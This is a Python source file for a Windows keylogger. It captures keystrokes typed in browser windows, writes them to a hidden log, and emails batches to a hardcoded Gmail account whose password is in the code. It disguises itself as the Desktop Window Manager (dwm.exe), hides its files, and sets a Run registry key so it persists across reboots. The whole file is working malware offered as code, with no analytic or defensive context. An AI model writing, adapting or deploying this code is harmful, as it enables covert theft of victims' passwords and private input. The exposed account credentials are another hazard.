import subprocess, pyHook, pythoncom, os, smtplib, time, threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

count = 0
caps = False
shift = False
log = os.environ['USERPROFILE'] + '\\dwm.log'


def sendmail(data):
    msg = MIMEMultipart()
    msg['Subject'] = 'log ' + time.strftime('%c')
    msg['From'] = 'miniprojis@gmail.com'
    msg['To'] = 'miniprojis@gmail.com'
    msg.attach(MIMEText(data, 'plain'))
    s = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    s.login('miniprojis', 'isprojmini')
    s.sendmail('miniprojis@gmail.com', ['miniprojis@gmail.com'], msg.as_string())
    s.close()


def onkeyboardrelease(event):
    global log, count, shift
    windowname = event.WindowName
    if type(windowname) == None:
        return True
    else:
        windowname = windowname.lower()
    if 'chrome' in windowname or 'firefox' in windowname or 'internet explorer' in windowname:
        key = event.Key
        if key == 'Lshift' or key == 'Rshift':
            shift = False
        if count >= 50:
            output = open(log, 'r+')
            data = output.read()
            output.seek(0, os.SEEK_SET)
            output.truncate()
            output.close()
            count = 0
            threading.Thread(target=sendmail, args=(data,)).start()
    return True


def onkeyboardpress(event):
    global log, count, caps, shift
    windowname = event.WindowName
    if type(windowname) == None:
        return True
    else:
        windowname = windowname.lower()
    if 'chrome' in windowname or 'firefox' in windowname or 'internet explorer' in windowname:
        key = event.Key
        ID = event.KeyID
        if key == 'Capital':
            caps = not caps
        elif key == 'Lshift' or key == 'Rshift':
            shift = True
        else:
            count += 1
            if os.path.exists(log):
                output = open(log, 'a+')
            else:
                output = open(log, 'a+')
                subprocess.call('attrib +h +s %userprofile%\\dwm.log', shell=True)
            # english letters
            if 64 < ID < 91:
                if caps or shift:
                    output.write(chr(ID))
                else:
                    output.write(chr(ID+32))
            # any other printable character
            else:
                # backspace
                if ID == 8:
                    count -= 2
                    if count <= 0:
                        count = 0
                    else:
                        output.seek(-1, os.SEEK_END)
                        output.truncate()
                # tab
                elif ID == 9:
                    output.write('\t')
                # enter
                elif ID == 13:
                    output.write('\n')
                # space
                elif ID == 32:
                    output.write(' ')
                # NumPad
                elif 95 < ID < 106:
                    output.write(chr(ID-48))
                elif shift:
                    if ID == 192:
                        output.write('~')
                    elif ID == 48:
                        output.write(')')
                    elif ID == 49:
                        output.write('!')
                    elif ID == 50:
                        output.write('@')
                    elif ID == 51:
                        output.write('#')
                    elif ID == 52:
                        output.write('$')
                    elif ID == 53:
                        output.write('%')
                    elif ID == 54:
                        output.write('^')
                    elif ID == 55:
                        output.write('&')
                    elif ID == 56:
                        output.write('*')
                    elif ID == 57:
                        output.write('(')
                    elif ID == 189:
                        output.write('_')
                    elif ID == 187:
                        output.write('+')
                    elif ID == 219:
                        output.write('{')
                    elif ID == 221:
                        output.write('}')
                    elif ID == 220:
                        output.write('|')
                    elif ID == 186:
                        output.write(':')
                    elif ID == 222:
                        output.write('\"')
                    elif ID == 188:
                        output.write('<')
                    elif ID == 190:
                        output.write('>')
                    elif ID == 191:
                        output.write('?')
                    else:
                        count -= 1
                else:
                    if ID == 192:
                        output.write('`')
                    elif ID == 48:
                        output.write('0')
                    elif ID == 49:
                        output.write('1')
                    elif ID == 50:
                        output.write('2')
                    elif ID == 51:
                        output.write('3')
                    elif ID == 52:
                        output.write('4')
                    elif ID == 53:
                        output.write('5')
                    elif ID == 54:
                        output.write('6')
                    elif ID == 55:
                        output.write('7')
                    elif ID == 56:
                        output.write('8')
                    elif ID == 57:
                        output.write('9')
                    elif ID == 189:
                        output.write('-')
                    elif ID == 187:
                        output.write('=')
                    elif ID == 219:
                        output.write('[')
                    elif ID == 221:
                        output.write(']')
                    elif ID == 220:
                        output.write('\\')
                    elif ID == 186:
                        output.write(';')
                    elif ID == 222:
                        output.write('\'')
                    elif ID == 188:
                        output.write(',')
                    elif ID == 190:
                        output.write('.')
                    elif ID == 191:
                        output.write('/')
                    else:
                        count -= 1
            output.close()
    return True


subprocess.call('copy dwm.exe %userprofile%\\', shell=True)
subprocess.call('REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /f /v Desktop_Window_Manager /t REG_SZ /d %userprofile%\\dwm.exe', shell=True)
subprocess.call('attrib +r +h +s %userprofile%\\dwm.exe', shell=True)

hooks_manager = pyHook.HookManager()

hooks_manager.KeyDown = onkeyboardpress
hooks_manager.KeyUp = onkeyboardrelease

hooks_manager.HookKeyboard()

pythoncom.PumpMessages()
